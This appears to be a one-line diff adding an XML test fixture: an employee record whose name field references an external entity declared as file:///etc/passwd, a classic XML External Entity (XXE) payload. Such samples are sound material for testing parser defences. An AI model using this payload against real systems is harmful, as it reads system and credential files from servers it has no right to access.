@@ -1,0 +1,1 @@
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "file:///etc/passwd" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
